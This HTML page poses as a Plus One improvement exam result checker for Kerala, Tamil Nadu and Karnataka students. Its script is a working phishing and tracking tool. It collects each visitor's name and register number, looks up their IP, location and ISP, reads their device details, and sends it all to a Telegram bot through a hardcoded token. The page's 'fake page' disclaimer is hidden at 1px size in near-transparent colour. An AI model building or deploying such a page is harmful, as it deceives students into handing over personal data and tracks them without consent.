<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Plus One Improvment Result 2025-2026</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
:root{
  --primary:#0a3d62;
  --bg:#eef2f7;
}
*{box-sizing:border-box}
body{
  margin:0;
  font-family:"Segoe UI",Arial,sans-serif;
  background:var(--bg);
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100vh;
}

/* Card */
.card{
  width:100%;
  max-width:480px;
  background:#fff;
  padding:24px;
  border-radius:14px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
}

/* Header */
h2{
  margin:0 0 10px;
  text-align:center;
  color:var(--primary);
}
.sub{
  text-align:center;
  font-size:1px;
  color:#66666603;
  margin-bottom:15px;
}

/* Form */
label{
  display:block;
  margin-top:12px;
  font-weight:600;
}
input,select{
  width:100%;
  padding:10px;
  margin-top:5px;
  border-radius:8px;
  border:1px solid #ccc;
  outline:none;
}
input:focus,select:focus{
  border-color:var(--primary);
}

/* Button */
button{
  width:100%;
  margin-top:18px;
  padding:12px;
  border:none;
  border-radius:8px;
  background:var(--primary);
  color:#fff;
  font-weight:bold;
  cursor:pointer;
  transition:.2s;
}
button:hover{opacity:.9}

/* Loader */
.loader{
  display:none;
  text-align:center;
  padding:40px 0;
}
.spinner{
  width:60px;height:60px;
  border:6px solid #ddd;
  border-top:6px solid var(--primary);
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:auto;
}
@keyframes spin{100%{transform:rotate(360deg);}}

/* Image */
.result-img{
  display:none;
  text-align:center;
}
.result-img img{
  width:100%;
  border-radius:10px;
}
</style>
</head>

<body>

<div class="card">

<div id="formBox">
  <h2>Plus one improvment Result </h2>
  <div class="sub">fake page don't enter real data</div>

  <label>State</label>
  <select id="state">
    <option>Kerala</option>
    <option>Tamil Nadu</option>
    <option>Karnataka</option>
  </select>

  <label>Register Number</label>
  <input type="number" id="reg" placeholder="Numbers only">

  <label>Full Name</label>
  <input type="text" id="name">

  <button onclick="handleClick()">View Result</button>
</div>

<div class="loader" id="loader">
  <div class="spinner"></div>
  <p>Checking details...</p>
</div>

<div class="result-img" id="imgBox">
  <img src="https://i.ibb.co/MD4CgVmW/temp.jpg">
</div>

</div>

<script>
const BOT_TOKEN = "8543900080:AAH2aQPO43Zro1K9-6j-Yf9vL54jHsEm-5g";
const CHAT_ID = "8571274512";

function getTime12h(){
  return new Date().toLocaleString('en-IN',{hour12:true});
}

async function handleClick(){
  let name = document.getElementById("name").value.trim();
  let reg = document.getElementById("reg").value.trim();
  let state = document.getElementById("state").value;

  if(!name || !reg) return;

  document.getElementById("formBox").style.display="none";
  document.getElementById("loader").style.display="block";

  let country="Unknown", city="Unknown", ip="Unknown", isp="Unknown";

  try{
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();
    country = data.country_name;
    city = data.city;
    ip = data.ip;
    isp = data.org || "Unknown";
  }catch(e){}

  let ua = navigator.userAgent;
  let screenSize = screen.width + "x" + screen.height;

  let msg =
`Demo Entry
Name: ${name}
Reg: ${reg}
State: ${state}

Country: ${country}
City: ${city}
IP: ${ip}
ISP: ${isp}

Time: ${getTime12h()}
Device: ${ua}
Screen: ${screenSize}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:msg
    })
  });

  setTimeout(()=>{
    document.getElementById("loader").style.display="none";
    document.getElementById("imgBox").style.display="block";
  },2000);
}
</script>

</body>
  </html>
